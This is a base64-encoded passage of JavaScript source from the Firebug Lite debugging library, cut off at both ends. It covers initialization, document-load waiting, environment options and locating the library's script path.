z0gMikNCiAgICB7DQogICAgICAgIHZhciBmbiA9IG5hbWVzcGFjZXNbaV07DQogICAgICAgIHZhciBucyA9IG5hbWVzcGFjZXNbaSsxXTsNCiAgICAgICAgZm4uYXBwbHkobnMpOw0KICAgIH0NCiAgICANCiAgICBpZiAoRkJUcmFjZS5EQkdfSU5JVElBTElaRSkgew0KICAgICAgICBGQlRyYWNlLnN5c291dCgiRkJMLmluaXRpYWxpemUiLCBuYW1lc3BhY2VzLmxlbmd0aC8yKyIgbmFtZXNwYWNlcyBFTkQiKTsNCiAgICAgICAgRkJUcmFjZS5zeXNvdXQoIkZCTCB3YWl0Rm9yRG9jdW1lbnQiLCAid2FpdGluZyBkb2N1bWVudCBsb2FkIik7DQogICAgfQ0KICAgIA0KICAgIEZCTC5BamF4LmluaXRpYWxpemUoKTsNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogDQogICAgLy8gZmluaXNoIGVudmlyb25tZW50IGluaXRpYWxpemF0aW9uDQogICAgRkJMLkZpcmVidWcubG9hZFByZWZzKCk7DQogICAgDQogICAgaWYgKEZCTC5FbnYuT3B0aW9ucy5lbmFibGVQZXJzaXN0ZW50KQ0KICAgIHsNCiAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gcGVyc2lzdCAtIG1ha2UgYSBiZXR0ZXIgc3luY2hyb25pemF0aW9uDQogICAgICAgIGlmIChpc0Nocm9tZUNvbnRleHQpDQogICAgICAgIHsNCiAgICAgICAgICAgIEZCTC5GaXJlYnVnQ2hyb21lLmNsb25lKEZCTC5FbnYuRmlyZWJ1Z0Nocm9tZSk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBGQkwuRW52LkZpcmVidWdDaHJvbWUgPSBGQkwuRmlyZWJ1Z0Nocm9tZTsNCiAgICAgICAgICAgIEZCTC5FbnYudHJhY2VNZXNzYWdlUXVldWUgPSBGQlRyYWNlLm1lc3NhZ2VRdWV1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogDQogICAgLy8gd2FpdCBkb2N1bWVudCBsb2FkDQogICAgDQogICAgd2FpdEZvckRvY3VtZW50KCk7DQp9Ow0KDQp2YXIgd2FpdEZvckRvY3VtZW50ID0gZnVuY3Rpb24gd2FpdEZvckRvY3VtZW50KCkNCnsNCiAgICAvLyBkb2N1bWVudC5ib2R5IG5vdCBhdmFpbGFibGUgaW4gWE1MK1hTTCBkb2N1bWVudHMgaW4gRmlyZWZveA0KICAgIHZhciBkb2MgPSBGQkwuRW52LmJyb3dzZXIuZG9jdW1lbnQ7DQogICAgdmFyIGJvZHkgPSBkb2MuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImJvZHkiKVswXTsNCiAgICANCiAgICBpZiAoYm9keSkNCiAgICB7DQogICAgICAgIGNhbGN1bGF0ZVBpeGVsc1BlckluY2goZG9jLCBib2R5KTsNCiAgICAgICAgb25Eb2N1bWVudExvYWQoKTsNCiAgICB9DQogICAgZWxzZQ0KICAgICAgICBzZXRUaW1lb3V0KHdhaXRGb3JEb2N1bWVudCwgNTApOw0KfTsNCg0KdmFyIG9uRG9jdW1lbnRMb2FkID0gZnVuY3Rpb24gb25Eb2N1bWVudExvYWQoKQ0Kew0KICAgIGlmIChGQlRyYWNlLkRCR19JTklUSUFMSVpFKSBGQlRyYWNlLnN5c291dCgiRkJMIG9uRG9jdW1lbnRMb2FkIiwgImRvY3VtZW50IGxvYWRlZCIpOw0KICAgIA0KICAgIC8vIGZpeCBJRTYgcHJvYmxlbSB3aXRoIGNhY2hlIG9mIGJhY2tncm91bmQgaW1hZ2VzLCBjYXVzaW5nIGEgbG90IG9mIGZsaWNrZXJpbmcgDQogICAgaWYgKEZCTC5pc0lFNikNCiAgICAgICAgZml4SUU2QmFja2dyb3VuZEltYWdlQ2FjaGUoKTsNCiAgICAgICAgDQogICAgLy8gY2hyb21lIGNvbnRleHQgb2YgdGhlIHBlcnNpc3RlbnQgYXBwbGljYXRpb24NCiAgICBpZiAoRkJMLkVudi5PcHRpb25zLmVuYWJsZVBlcnNpc3RlbnQgJiYgRkJMLkVudi5pc0Nocm9tZUNvbnRleHQpDQogICAgew0KICAgICAgICAvLyBmaW5hbGx5LCBzdGFydCB0aGUgYXBwbGljYXRpb24gaW4gdGhlIGNocm9tZSBjb250ZXh0DQogICAgICAgIEZCTC5GaXJlYnVnLmluaXRpYWxpemUoKTsNCiAgICAgICAgDQogICAgICAgIC8vIGlmIGlzIG5vdCBkZXZlbG9wbWVudCBtb2RlLCByZW1vdmUgdGhlIHNoYXJlZCBlbnZpcm9ubWVudCBjYWNoZSBvYmplY3QNCiAgICAgICAgLy8gdXNlZCB0byBzeW5jaHJvbml6ZSB0aGUgYm90aCBwZXJzaXN0ZW50IGNvbnRleHRzDQogICAgICAgIGlmICghRkJMLkVudi5pc0RldmVsb3BtZW50TW9kZSkNCiAgICAgICAgew0KICAgICAgICAgICAgc2hhcmVkRW52LmRlc3Ryb3koKTsNCiAgICAgICAgICAgIHNoYXJlZEVudiA9IG51bGw7DQogICAgICAgIH0NCiAgICB9DQogICAgLy8gbm9uLXBlcnNpc3RlbnQgYXBwbGljYXRpb24NCiAgICBlbHNlDQogICAgew0KICAgICAgICBGQkwuRmlyZWJ1Z0Nocm9tZS5jcmVhdGUoKTsNCiAgICB9DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIEVudg0KDQp2YXIgc2hhcmVkRW52Ow0KDQp0aGlzLkVudiA9DQp7DQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqIA0KICAgIC8vIEVudiBPcHRpb25zICh3aWxsIGJlIHRyYW5zcG9ydGVkIHRvIEZpcmVidWcgb3B0aW9ucykNCiAgICBPcHRpb25zOg0KICAgIHsNCiAgICAgICAgc2F2ZUNvb2tpZXM6IHRydWUsDQogICAgDQogICAgICAgIHNhdmVXaW5kb3dQb3NpdGlvbjogZmFsc2UsDQogICAgICAgIHNhdmVDb21tYW5kTGluZUhpc3Rvcnk6IGZhbHNlLA0KICAgICAgICANCiAgICAgICAgc3RhcnRPcGVuZWQ6IGZhbHNlLA0KICAgICAgICBzdGFydEluTmV3V2luZG93OiBmYWxzZSwNCiAgICAgICAgc2hvd0ljb25XaGVuSGlkZGVuOiB0cnVlLA0KICAgICAgICANCiAgICAgICAgb3ZlcnJpZGVDb25zb2xlOiB0cnVlLA0KICAgICAgICBpZ25vcmVGaXJlYnVnRWxlbWVudHM6IHRydWUsDQogICAgICAgIGRpc2FibGVXaGVuRmlyZWJ1Z0FjdGl2ZTogdHJ1ZSwNCiAgICAgICAgDQogICAgICAgIGRpc2FibGVYSFJMaXN0ZW5lcjogZmFsc2UsDQogICAgICAgIGRpc2FibGVSZXNvdXJjZUZldGNoaW5nOiBmYWxzZSwNCiAgICAgICAgDQogICAgICAgIGVuYWJsZVRyYWNlOiBmYWxzZSwNCiAgICAgICAgZW5hYmxlUGVyc2lzdGVudDogZmFsc2UNCiAgICAgICAgDQogICAgfSwNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogDQogICAgLy8gTGlicmFyeSBsb2NhdGlvbg0KICAgIExvY2F0aW9uOg0KICAgIHsNCiAgICAgICAgc291cmNlRGlyOiBudWxsLA0KICAgICAgICBiYXNlRGlyOiBudWxsLA0KICAgICAgICBza2luRGlyOiBudWxsLA0KICAgICAgICBza2luOiBudWxsLA0KICAgICAgICBhcHA6IG51bGwNCiAgICB9LA0KDQogICAgc2tpbjogInhwIiwNCiAgICB1c2VMb2NhbFNraW46IGZhbHNlLA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiANCiAgICAvLyBFbnYgc3RhdGVzDQogICAgaXNEZXZlbG9wbWVudE1vZGU6IGZhbHNlLA0KICAgIGlzRGVidWdNb2RlOiBmYWxzZSwNCiAgICBpc0Nocm9tZUNvbnRleHQ6IGZhbHNlLA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiANCiAgICAvLyBFbnYgcmVmZXJlbmNlcw0KICAgIGJyb3dzZXI6IG51bGwsDQogICAgY2hyb21lOiBudWxsDQp9Ow0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp2YXIgZGVzdHJveUVudmlyb25tZW50ID0gZnVuY3Rpb24gZGVzdHJveUVudmlyb25tZW50KCkNCnsNCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIEZCTCA9IG51bGw7DQogICAgfSwgMTAwKTsNCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gTGlicmFyeSBsb2NhdGlvbg0KDQp2YXIgZmluZExvY2F0aW9uID0gIGZ1bmN0aW9uIGZpbmRMb2NhdGlvbigpIA0Kew0KICAgIHZhciByZUZpcmVidWdGaWxlID0gLyhmaXJlYnVnLWxpdGUoPzotXHcrKT8oPzpcLmpzfFwuamd6KSkoPzojKC4rKSk/JC87DQogICAgdmFyIHJlR2V0RmlyZWJ1Z1NpdGUgPSAvKD86aHR0cHxodHRwcyk6XC9cL2dldGZpcmVidWcuY29tXC8vOw0KICAgIHZhciBpc0dldEZpcmVidWdTaXRlOw0KICAgIA0KICAgIHZhciByZVBhdGggPSAvXiguKlwvKS87DQogICAgdmFyIHJlUHJvdG9jb2wgPSAvXlx3KzpcL1wvLzsNCiAgICB2YXIgcGF0aCA9IG51bGw7DQogICAgdmFyIGRvYyA9IGRvY3VtZW50Ow0KICAgIA0KICAgIC8vIEZpcmVidWcgTGl0ZSAxLjMuMCBib29rbWFya2xldCBpZGVudGlmaWNhdGlvbg0KICAgIHZhciBzY3JpcHQgPSBkb2MuZ2V0RWxlbWVudEJ5SWQoIkZpcmVidWdMaXRlIik7DQogICAgDQogICAgdmFyIHNjcmlwdFNyYzsNCiAgICB2YXIgaGFzU3JjQXR0cmlidXRlID0gdHJ1ZTsNCiAgICANCiAgICAvLyBJZiB0aGUgc2NyaXB0IHdhcyBsb2FkZWQgdmlhIGJvb2ttYXJrbGV0LCB3ZSBhbHJlYWR5IGhhdmUgdGhlIHNjcmlwdCB0YWcNCiAgICBpZiAoc2NyaXB0KQ0KICAgIHsNCiAgICAgICAgc2NyaXB0U3JjID0gc2NyaXB0LnNyYzsNCiAgICAgICAgZmlsZSA9IHJlRmlyZWJ1Z0ZpbGUuZXhlYyhzY3JpcHRTcmMpOw0KICAgICAgICANCiAgICAgICAgdmFyIHZlcnNpb24gPSBzY3JpcHQuZ2V0QXR0cmlidXRlKCJGaXJlYnVnTGl0ZSIpOw0KICAgICAgICB2YXIgbnVtYmVyID0gdmVyc2lvbiA/IHBhcnNlSW50KHZlcnNpb24pIDogMDsgDQogICAgICAgIA0KICAgICAgICBpZiAoIXZlcnNpb24gfHwgIW51bWJlciB8fCBudW1iZXIgPCBib29rbWFya2xldFZlcnNpb24pDQogICAgICAgIHsNCiAgICAgICAgICAgIEZCTC5FbnYuYm9va21hcmtsZXRPdXRkYXRlZCA9IHRydWU7DQogICAgICAgIH0NCiAgICB9DQogICAgLy8gb3RoZXJ3aXNlIHdlIG11c3Qgc2VhcmNoIGZvciB0aGUgY29ycmVjdCBzY3JpcHQgdGFnDQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgZm9yKHZhciBpPTAsIHM9ZG9jLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJzY3JpcHQiKSwgc2k7IHNpPXNbaV07IGkrKykNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGZpbGUgPSBudWxsOw0KICAgICAgICAgICAgaWYgKCBzaS5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpID09ICJzY3JpcHQiICkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoZmlsZSA9IHJlRmlyZWJ1Z0ZpbGUuZXhlYyhzaS5nZXRBdHRyaWJ1dGUoImZpcmVidWdTcmMiKSkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzY3JpcHRTcmMgPSBzaS5nZXRBdHRyaWJ1dGUoImZpcmVidWdTcmMiKTsNCiAgICAgICAgICAgICAgICAgICAgaGFzU3JjQXR0cmlidXRlID0gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UgaWYgKGZpbGUgPSByZUZpcmVidWdGaWxlLmV4ZWMoc2kuc3JjKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHNjcmlwdFNyYyA9IHNpLnNyYzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBzY3JpcHQgPSBzaTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8vIG1hcmsgdGhlIHNjcmlwdCB0YWcgdG8gYmUgaWdub3JlZCBieSBGaXJlYnVnIExpdGUNCiAgICBpZiAoc2NyaXB0KQ0KICAgICAgICBzY3JpcHQuZmlyZWJ1Z0lnbm9yZSA9IHRydWU7DQogICAgDQogICAgaWYgKGZpbGUpDQogICAgew0KICAgICAgICB2YXIgZmlsZU5hbWUgPSBmaWxlWzFdOw0KICAgICAgICB2YXIgZmlsZU9wdGlvbnMgPSBmaWxlWzJdOw0KICAgICAgICANCiAgICAgICAgLy8gYWJzb2x1dGUgcGF0aA0KICAgICAgICBpZiAocmVQcm90b2NvbC50ZXN0KHNjcmlwdFNyYykpIHsNCiAgICAgICAgICAgIHBhdGggPSByZVBhdGguZXhlYyhzY3JpcHRTcmMpWzFdOw0KICAgICAgICAgIA0KICAgICAgICB9DQogICAgICAgIC8vIHJlbGF0aXZlIHBhdGgNCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgciA9IHJlUGF0aC5leGVjKHNjcmlwdFNyYyk7DQogICAgICAgICAgICB2YXIgc3JjID0gciA/IHJbMV0gOiBzY3JpcHRTcmM7DQogICAgICAgICAgICB2YXIgYmFja0RpciA9IC9eKCg/OlwuXC5cLykrKSguKikvLmV4ZWMoc3JjKTsNCiAgICAgICAgICAgIHZhciByZUxhc3REaXIgPSAvXiguKlwvKVteXC9dK1wvJC87DQogICAgICAgICAgICBwYXRoID0gcmVQYXRoLmV4ZWMobG9jYXRpb24uaHJlZilbMV07DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vICIuLi9zb21lL3BhdGgiDQogICAgICAgICAgICBpZiAoYmFja0RpcikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgaiA9IGJhY2tEaXJbMV0ubGVuZ3RoLzM7DQogICAgICAgICAgICAgICAgdmFyIHA7DQogICAgICAgICAgICAgICAgd2hpbGUgKGotLSA+IDApDQogICAgICAgICAgICAgICAgICAgIHBhdGggPSByZUxhc3REaXIuZXhlYyhwYXRoKVsxXTsNCg0KICAgICAgICAgICAgICAgIHBhdGggKz0gYmFja0RpclsyXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZWxzZSBpZihzcmMuaW5kZXhPZigiLyIpICE9IC0xKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vICIuL3NvbWUvcGF0aCINCiAgICAgICAgICAgICAgICBpZigvXlwuXC8uLy50ZXN0KHNyYykpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBwYXRoICs9IHNyYy5zdWJzdHJpbmcoMik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIC8vICIvc29tZS9wYXRoIg0KICAgICAgICAgICAgICAgIGVsc2UgaWYoL15cLy4vLnRlc3Qoc3JjKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBkb21haW4gPSAvXihcdys6XC9cL1teXC9dKykvLmV4ZWMocGF0aCk7DQogICAgICAgICAgICAgICAgICAgIHBhdGggPSBkb21haW5bMV0gKyBzcmM7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIC8vICJzb21lL3BhdGgiDQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcGF0aCArPSBzcmM7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIA0KICAgIEZCTC5FbnYuaXNDaHJvbWVFeHRlbnNpb24gPSBzY3JpcHQgJiYgc2NyaXB0LmdldEF0dHJpYnV0ZSgiZXh0ZW5zaW9uIikgPT0gIkNocm9tZSI7IA0KICAgIGlmIChGQkwuRW52LmlzQ2hyb21lRXh0ZW5zaW9uKQ0KICAgIHsNCiAgICAgICAgcGF0aCA9IHByb2R1Y3Rpb25EaXI7DQogICAgICAgIEZCTC5FbnYuYm9va21hcmtsZXRPdXRkYXRlZCA9IGZhbHNlOw0KICAgICAgICBzY3JpcHQgPSB7aW5uZXJIVE1MOiAie3Nob3dJY29uV2hlbkhpZGRlbjpmYWxzZX0ifTsNCiAgICB9DQogICAgDQogICAgaXNHZXRGaXJlYnVnU2l0ZSA9IHJlR2V0RmlyZWJ1Z1NpdGUudGVzdChwYXRoKTsNCiAgICANCiAgICBpZiAoaXNHZXRGaXJlYnVnU2l0ZSAmJiBwYXRoLmluZGV4T2YoIi9yZWxlYXNlcy9saXRlLyIpID09IC0xKQ0KICAgIHsNCiAgICAgICAgLy8gU2VlIElzc3VlIDQ1ODcgLSBJZiB3ZSBhcmUgbG9hZGluZyB0aGUgc2NyaXB0IGZyb20gZ2V0ZmlyZWJ1Zy5jb20gc2hvcnRjdXQsIGxpa2UgDQogICAgICAgIC8vIGh0dHBzOi8vZ2V0ZmlyZWJ1Zy5jb20vZmlyZWJ1Zy1saXRlLmpzLCB0aGVuIHdlIG11c3QgbWFudWFsbHkgYWRkIHRoZSBmdWxsIHBhdGgsDQogICAgICAgIC8vIG90aGVyd2lzZSB0aGUgRW52LkxvY2F0aW9uIHdpbGwgaG9sZCB0aGUgd3JvbmcgcGF0aCwgd2hpY2ggd2lsbCBpbiB0dXJuIGxlYWQgdG8NCiAgICAgICAgLy8gdW5kZXNpcmFibGUgZWZmZWN0cyBsaWtlIHRoZSBwcm9ibGVtIGluIElzc3VlIDQ1ODcNCiAgICAgICAgcGF0aCArPSAicmVsZWFzZXMvbGl0ZS8iICsgKGZpbGVOYW1lID09ICJmaXJlYnVnLWxpdGUtYmV0YS5qcyIgPyAiYmV0YS8iIDogImxhdGVzdC8iKTsNCiAgICB9DQogICAgDQogICAgdmFyIG0gPSBwYXRoICYmIHBhdGgubWF0Y2goLyhbXlwvXSspXC8kLykgfHwgbnVsbDsNCiAgICANCiAgICBpZiAocGF0aCAmJiBtKQ0KICAgIHsNCiAgICAgICAgdmFyIEVudiA9IEZCTC5FbnY7DQogICAgICAgIA0KICAgICAgICAvLyBBbHdheXMgdXNlIHRoZSBsb2NhbCBza2luIHdoZW4gcnVubmluZyBpbiB0aGUgc2FtZSBkb21haW4NCiAgICAgICAgLy8gU2VlIElzc3VlIDM1NTQ6IEZpcmVidWcgTGl0ZSBzaG91bGQgdXNlIGxvY2FsIGltYWdlcyB3aGVuIGxvYWRlZCBsb2NhbGx5DQogICAgICAgIEVudi51c2VMb2NhbFNraW4gPSBwYXRoLmluZGV4T2YobG9jYXRpb24ucHJvdG9jb2wgKyAiLy8iICsgbG9jYXRpb24uaG9zdCArICIvIikgPT0gMCAmJg0KICAgICAgICAgICAgICAgIC8vIGJ1dCB3ZSBjYW5ub3QgdXNlIHRoZSBsb2NhbiBza2luIHdoZW4gbG9hZGVkIGZyb20gZ2V0ZmlyZWJ1Zy5jb20sIG90aGVyd2lzZQ0KICAgICAgICAgICAgICAgIC8vIHRoZSBib29rbWFya2xldCB3b24ndCB3b3JrIHdoZW4gdmlzaXRpbmcgZ2V0ZmlyZWJ1Zy5jb20NCiAgICAgICAgICAgICAgICAhaXNHZXRGaXJlYnVnU2l0ZTsNCiAgICAgICAgDQogICAgICAgIC8vIGRldGVjdGluZyBkZXZlbG9wbWVudCBhbmQgZGVidWcgbW9kZXMgdmlhIGZpbGUgbmFtZQ0KICAgICAgICBpZiAoZmlsZU5hbWUgPT0gImZpcmVidWctbGl0ZS1kZXYuanMiKQ0KICAgICAgICB7DQogICAgICAgICAgICBFbnYuaXNEZXZlbG9wbWVudE1vZGUgPSB0cnVlOw0KICAgICAgICAgICAgRW52LmlzRGVidWdNb2RlID0gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmIChmaWxlTmFtZSA9PSAiZmlyZWJ1Zy1saXRlLWRlYnVnLmpzIikNCiAgICAgICAgew0KICAgICAgICAgICAgRW52LmlzRGVidWdNb2RlID0gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgLy8gcHJvY2VzcyB0aGUgPGh0bWwgZGVidWc9InRydWUiPg0KICAgICAgICBpZiAoRW52LmJyb3dzZXIuZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmdldEF0dHJpYnV0ZSgiZGVidWciKSA9PSAidHJ1ZSIpDQogICAgICAgIHsNCiAgICAgICAgICAgIEVudi5PcHRpb25zLnN0YXJ0T3BlbmVkID0gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgLy8gcHJvY2VzcyB0aGUgU2NyaXB0IFVSTCBPcHRpb25zDQogICAgICAgIGlmIChmaWxlT3B0aW9ucykNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIG9wdGlvbnMgPSBmaWxlT3B0aW9ucy5zcGxpdCgiLCIpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBmb3IgKHZhciBpID0gMCwgbGVuZ3RoID0gb3B0aW9ucy5sZW5ndGg7IGkgPCBsZW5ndGg7IGkrKykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB2YXIgb3B0aW9uID0gb3B0aW9uc1tpXTsNCiAgICAgICAgICAgICAgICB2YXIgbmFtZSwgdmFsdWU7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKG9wdGlvbi5pbmRleE9mKCI9IikgIT0gLTEpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgcGFydHMgPSBvcHRpb24uc3BsaXQoIj0iKTsNCiAgICAgICAgICAgICAgICAgICAgbmFtZSA9IHBhcnRzWzBdOw0KICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9IGV2YWwodW5lc2NhcGUocGFydHNbMV0pKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgbmFtZSA9IG9wdGlvbjsNCiAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSB0cnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAobmFtZSA9PSAiZGVidWciKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgRW52LmlzRGVidWdNb2RlID0gISF2YWx1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZSBpZiAobmFtZSBpbiBFbnYuT3B0aW9ucykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEVudi5PcHRpb25zW25hbWVdID0gdmFsdWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEVudltuYW1lXSA9IHZhbHVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgLy8gcHJvY2VzcyB0aGUgU2NyaXB0IEpTT04gT3B0aW9ucw0KICAgICAgICBpZiAoaGFzU3JjQXR0cmlidXRlKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgaW5uZXJPcHRpb25zID0gRkJMLnRyaW0oc2NyaXB0LmlubmVySFRNTCk7DQogICAgICAgICAgICBpZiAoaW5uZXJPcHRpb25zKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBpbm5lck9wdGlvbnNPYmplY3QgPSBldmFsKCIoIiArIGlubmVyT3B0aW9ucyArICIpIik7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBpbm5lck9wdGlvbnNPYmplY3QpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB2YXIgdmFsdWUgPSBpbm5lck9wdGlvbnNPYmplY3RbbmFtZV07DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAobmFtZSA9PSAiZGVidWciKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBFbnYuaXNEZWJ1Z01vZGUgPSAhIXZhbHVlOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKG5hbWUgaW4gRW52Lk9wdGlvbnMpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEVudi5PcHRpb25zW25hbWVdID0gdmFsdWU7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBFbnZbbmFtZV0gPSB2YWx1ZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgaWYgKCFFbnYuT3B0aW9ucy5zYXZlQ29va2llcykNCiAgICAgICAgICAgIEZCTC5TdG9yZS5yZW1vdmUoIkZpcmVidWdMaXRlIik7DQogICAgICAgIA0KICAgICAgICAvLyBwcm9jZXNzIHRoZSBEZWJ1ZyBNb2RlDQogICAgICAgIGlmIChFbnYuaXNEZWJ1Z01vZGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIEVudi5PcHRpb25zLnN0YXJ0T3BlbmVkID0gdHJ1ZTsNCiAgICAgICAgICAgIEVudi5PcHRpb25zLmVuYWJsZVRyYWNlID0gdHJ1ZTsNCiAgICAgICAgICAgIEVudi5PcHRpb25zLmRpc2FibGVXaGVuRmlyZWJ1Z0FjdGl2ZSA9IGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICB2YXIgbG9jID0gRW52LkxvY2F0aW9uOw0KICAgICAgICB2YXIgaXNQcm9kdWN0aW9uUmVsZWFzZSA9IHBhdGguaW5kZXhPZihwcm9kdWN0aW9uRGlyKSAhPSAtMTsNCiAgICAgICAgDQogICAgICAgIGxvYy5zb3VyY2VEaXIgPSBwYXRoOw0KICAgICAgICBsb2MuYmFzZURpciA9IHBhdGguc3Vic3RyKDAsIHBhdGgubGVuZ3RoIC0gbVsxXS5sZW5ndGggLSAxKTsNCiAgICAgICAgbG9jLnNraW5EaXIgPSAoaXNQcm9kdWN0aW9uUmVsZWFzZSA/IHBhdGggOiBsb2MuYmFzZURpcikgKyAic2tpbi8iICsgRW52LnNraW4gKyAiLyI7IA0KICAgICAgICBsb2Muc2tpbiA9IGxvYy5za2luRGlyICsgImZpcmVidWcuaHRtbCI7DQogICAgICAgIGxvYy5hcHAgPSBwYXRoICsgZmlsZU5hbWU7DQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgICAgIHRocm93IG5ldyBFcnJvcigiRmlyZWJ1ZyBFcnJvcjogTGlicmFyeSBwYXRoIG5vdCBmb3VuZCIpOw0KICAgIH0NCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gQmFzaWNzDQoNCnRoaXMuYmluZCA9IGZ1bmN0aW9uKCkgIC8vIGZuLCB0aGlzT2JqZWN0LCBhcmdzID0+IHRoaXNPYmplY3QuZm4oYXJncywgYXJndW1lbnRzKTsNCnsNCiAgIHZhciBhcmdzID0gY2xvbmVBcn